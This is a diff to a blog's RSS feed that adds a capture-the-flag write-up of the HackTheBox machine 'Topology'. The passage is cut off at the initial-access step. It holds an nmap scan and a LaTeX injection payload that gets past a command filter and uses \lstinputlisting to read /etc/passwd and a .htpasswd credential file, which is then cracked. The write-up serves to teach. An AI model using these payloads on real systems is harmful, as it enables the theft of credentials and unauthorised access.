@@ -6,10 +6,237 @@
     <description>ybenel (LaTeX)</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Tue, 13 Jun 2023 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Fri, 16 Jun 2023 00:00:00 +0000</lastBuildDate>
     
     <atom:link href="https://ybenel.cf/tags/latex/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>HTB - Topology</title>
+      <link>https://ybenel.cf/post/htb_topology/</link>
+      <pubDate>Fri, 16 Jun 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://ybenel.cf/post/htb_topology/</guid>
+      <description>&lt;p&gt;Topology is an easy box that starts off by finding a local file discloser vulnerability,
+In a LaTeX template, which allows us to get gain access by obtaining a password file with an encrypted password
+that&amp;rsquo;s reused by a user on the box.
+For ROOT there&amp;rsquo;s a setuid binary which we simply use to obtain root privileges.&lt;/p&gt;
+&lt;h2 id=&#34;slim-to-none&#34; &gt;Slim To None
+&lt;span&gt;
+    &lt;a href=&#34;#slim-to-none&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;&lt;h3 id=&#34;user-enumeration&#34; &gt;User Enumeration
+&lt;span&gt;
+    &lt;a href=&#34;#user-enumeration&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;h4 id=&#34;open-ports&#34; &gt;Open Ports
+&lt;span&gt;
+    &lt;a href=&#34;#open-ports&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h4&gt;&lt;p&gt;As usual with most boxes only 2 ports open.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;80 HTTP (Apache)&lt;/li&gt;
+&lt;li&gt;22 SSH (OpenSSH)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!--listend--&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic&#34;&gt;#Nmap 7.93 scan initiated Fri Jun 16 21:37:29 2023 as: nmap -p- --min-rate=10000 -sCV -oN scans/full-scan.nmap -vvv 10.10.11.217
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic&#34;&gt;&lt;/span&gt;Nmap scan report &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;10.10.11.217&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up, received syn-ack (&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;0.15&lt;/span&gt;s latency).
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Scanned at &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;2023&lt;/span&gt;-&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;06&lt;/span&gt;-&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;21&lt;/span&gt;:&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;37&lt;/span&gt;:&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;30&lt;/span&gt; UTC &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;87&lt;/span&gt;s
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;38893&lt;/span&gt; closed tcp ports (conn-refused), &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;26640&lt;/span&gt; filtered tcp ports (no-response)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE REASON  VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;22&lt;/span&gt;/tcp open  ssh     syn-ack OpenSSH &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;8.2&lt;/span&gt;p1 Ubuntu &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;4u&lt;/span&gt;buntu0&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;.7&lt;/span&gt; (Ubuntu Linux; protocol &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;2.0&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ssh-hostkey:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;3072&lt;/span&gt; dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC65qOGPSRC7ko+...[snip]...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;256&lt;/span&gt; d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdH..[snip].&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;.8&lt;/span&gt;R28Y4CDP7h0h9vnlLWo=
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;256&lt;/span&gt; &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;4&lt;/span&gt;ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaM68hPSVQXNWZbTV88LsN41odqyoxxgwKEb1SOPm5k
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;80&lt;/span&gt;/tcp open  http    syn-ack Apache httpd &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;2.4.41&lt;/span&gt; ((Ubuntu))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| http-methods:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_  Supported Methods: OPTIONS HEAD GET POST
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-server-header: Apache/&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;2.4.41&lt;/span&gt; (Ubuntu)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title: Miskatonic University | Topology Group
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;initial-enum&#34; &gt;Initial Enum
+&lt;span&gt;
+    &lt;a href=&#34;#initial-enum&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h4&gt;&lt;p&gt;Checking the http site, we just get a static site with a bunch &lt;strong&gt;users&lt;/strong&gt; and an &lt;strong&gt;email&lt;/strong&gt; and a list of &lt;strong&gt;projects&lt;/strong&gt;.
+&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_webpage.png&#34;/&gt;&lt;figcaption&gt;
+            &lt;h4&gt;Default Web Page&lt;/h4&gt;
+        &lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Lilian Klein (lklein@topology.htb)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Vajramani Daisley
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Derek Abrahams
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The interesting one is the &lt;strong&gt;LaTeX Equation Generator&lt;/strong&gt; which is pointing to &lt;a href=&#34;http://latex.topology.htb&#34;&gt;http://latex.topology.htb&lt;/a&gt;.&lt;/p&gt;
+&lt;!--list-separator--&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Vhost discovery.&lt;/p&gt;
+&lt;p&gt;We also will look for any other subdomains that might be hidden. Like our other projects or something better.
+For that we&amp;rsquo;ll use &lt;strong&gt;Ffuf&lt;/strong&gt;.&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_vhost.png&#34;/&gt;&lt;figcaption&gt;
+                &lt;h4&gt;FUZZ With FFUF&lt;/h4&gt;
+            &lt;/figcaption&gt;
+    &lt;/figure&gt;
+
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;interesting-discoveries&#34; &gt;Interesting Discoveries
+&lt;span&gt;
+    &lt;a href=&#34;#interesting-discoveries&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;http://stats.topology.htb&#34;&gt;http://stats.topology.htb&lt;/a&gt; which is just a static webpage with jpg images.
+&lt;a href=&#34;http://dev.topology.htb&#34;&gt;http://dev.topology.htb&lt;/a&gt; requires &lt;strong&gt;credentials&lt;/strong&gt; in order to access it.&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_dev.png&#34;/&gt;&lt;figcaption&gt;
+            &lt;h4&gt;(Dev Sub) Require AUTH&lt;/h4&gt;
+        &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://latex.topology.htb&#34;&gt;http://latex.topology.htb&lt;/a&gt; is an open directory listing which has couple files.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_latex_dir.png&#34;/&gt;&lt;figcaption&gt;
+            &lt;h4&gt;Listing Directory&lt;/h4&gt;
+        &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+The interesting one is &lt;code&gt;equation.php&lt;/code&gt; which allows us to run latex commands and it compiles it then convert it into a png.
+&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_gen.png&#34;/&gt;&lt;figcaption&gt;
+            &lt;h4&gt;TEX Input Prompt&lt;/h4&gt;
+        &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_gen_out.png&#34;/&gt;&lt;figcaption&gt;
+            &lt;h4&gt;Generated Image&lt;/h4&gt;
+        &lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;h4 id=&#34;vulnerabilities-and-exploitation&#34; &gt;Vulnerabilities And Exploitation
+&lt;span&gt;
+    &lt;a href=&#34;#vulnerabilities-and-exploitation&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h4&gt;&lt;p&gt;Before we get into the file discloser vulnerability, let&amp;rsquo;s take a step further explaining what LaTeX is.
+LaTeX is a typesetting system to create documents, meaning there&amp;rsquo;s not much we can do except for reading
+local TeX files.
+In LaTeX there&amp;rsquo;s quite few Engines like, LuaLaTex, pdflatex, XeTex, Tex, Latex, LaTeX2e..
+there&amp;rsquo;s couple commands we can use to read a file.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\input&lt;/span&gt;{}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\include&lt;/span&gt;{}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\includeonly&lt;/span&gt;{}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\usepackage&lt;/span&gt;{}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;However if we tried any of these commands, we&amp;rsquo;ll instead get an illegal command output,
+So we can verify there&amp;rsquo;s some sort of input validation checking, that will try to protect it.
+&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_illegal.png&#34;/&gt;&lt;figcaption&gt;
+            &lt;h4&gt;Input Filtration&lt;/h4&gt;
+        &lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Except&lt;/em&gt; in the directory listing we see couple TeX files presented, so there might be a package used that
+has the ability to read files.
+Check &lt;code&gt;header.tex&lt;/code&gt; we can see the following packages used.
+&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_header.png&#34;/&gt;&lt;figcaption&gt;
+            &lt;h4&gt;Preamble Header&lt;/h4&gt;
+        &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+One that grabbed my attention was &lt;strong&gt;listings&lt;/strong&gt; which a package support typeset source code,
+Mainly used for syntax highlighting, numbering and listings.
+If you used LaTeX before and listings package you might be familiar with &lt;code class=&#34;code-inline language-latex&#34;&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\lsinputlisting&lt;/span&gt;&lt;/code&gt; which able to read a file.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\lsinputlisting&lt;/span&gt;&lt;span style=&#34;color:#ff0086;font-weight:bold&#34;&gt;[Language=Python]&lt;/span&gt;{myexample.py}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;%% OR Without the setting options.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\lsinputlisting&lt;/span&gt;{myexample.py}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So let&amp;rsquo;s try it.
+&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_lsinput_error.png&#34;/&gt;&lt;figcaption&gt;
+            &lt;h4&gt;LaTeX Errors&lt;/h4&gt;
+        &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+Hmm, it wasn&amp;rsquo;t able to successfully output an image.
+My first thoughts is that something is wrong with
+the back-end code that&amp;rsquo;s not handling LaTeX correctly like not escape backslash and its very
+common, when you create a preamble in &lt;em&gt;elisp&lt;/em&gt; or in this case &lt;em&gt;php&lt;/em&gt;
+So i&amp;rsquo;ve tried &lt;code class=&#34;code-inline language-latex&#34;&gt; &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\\\lsinputlisting&lt;/span&gt;{/etc/passwd}&lt;/code&gt; and it still didn&amp;rsquo;t work.
+Then i remembered that from the web page this note.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;LaTeX inline math mode syntax in the text field (only oneliners supported at the moment).&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Of cource one-liners do use dollar signs that&amp;rsquo;s way it didn&amp;rsquo;t work correctly.
+In the backend its something like this.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a&#34;&gt;$texfile&lt;/span&gt;=&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34; &lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;document{article}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;usepackage{listings}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;usepacakge{amsmath}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;usepackage{charter}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;begin{document}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#39;$&amp;#39; . &lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;$textinput&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt; . &amp;#39;$&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;end{document} &amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;in everything between &lt;code&gt;$MATHHERE$&lt;/code&gt; is considered a math equation.
+So let&amp;rsquo;s escape it.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\frac&lt;/span&gt;{1}{n^2}&lt;span style=&#34;color:#0086d2&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#fb660a&#34;&gt;\lstinputlisting&lt;/span&gt;{/etc/passwd}&lt;span style=&#34;color:#0086d2&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\frac&lt;/span&gt;{1}{n*2}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;and voila!
+&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_filediscloser.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;!--list-separator--&gt;
+&lt;h5 id=&#34;obtaining-access&#34; &gt;Obtaining Access.
+&lt;span&gt;
+    &lt;a href=&#34;#obtaining-access&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h5&gt;&lt;p&gt;I wasn&amp;rsquo;t able to read user&amp;rsquo;s ssh key, but since &lt;strong&gt;dev&lt;/strong&gt; subdomain is auth protected.
+We can use our file discoloser vulnerability to obtain the password.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://latex.topology.htb/equation.php?eqn=&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\frac&lt;/span&gt;{1}{n^2}&lt;span style=&#34;color:#0086d2&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#fb660a&#34;&gt;\lstinputlisting&lt;/span&gt;{/var/www/dev/.htpasswd}&lt;span style=&#34;color:#0086d2&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\frac&lt;/span&gt;{1}{n*2}&amp;amp;submit=
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now Let&amp;rsquo;s convert our image to text.
+&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/toplogy_imageToText.png&#34;/&gt;&lt;figcaption&gt;
+            &lt;h4&gt;Converting Image To Text&lt;/h4&gt;
+        &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+And finally let&amp;rsquo;s crack it with hashcat.
+&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_passwordcrack.png&#34;/&gt;&lt;figcaption&gt;
+            &lt;h4&gt;Cracking With Hashcat&lt;/h4&gt;
+        &lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;h4 id=&#34;initial-access-dot&#34; &gt;Initial Access.
+&lt;span&gt;
+    &lt;a href=&#34;#initial-access-dot&#34;&gt;
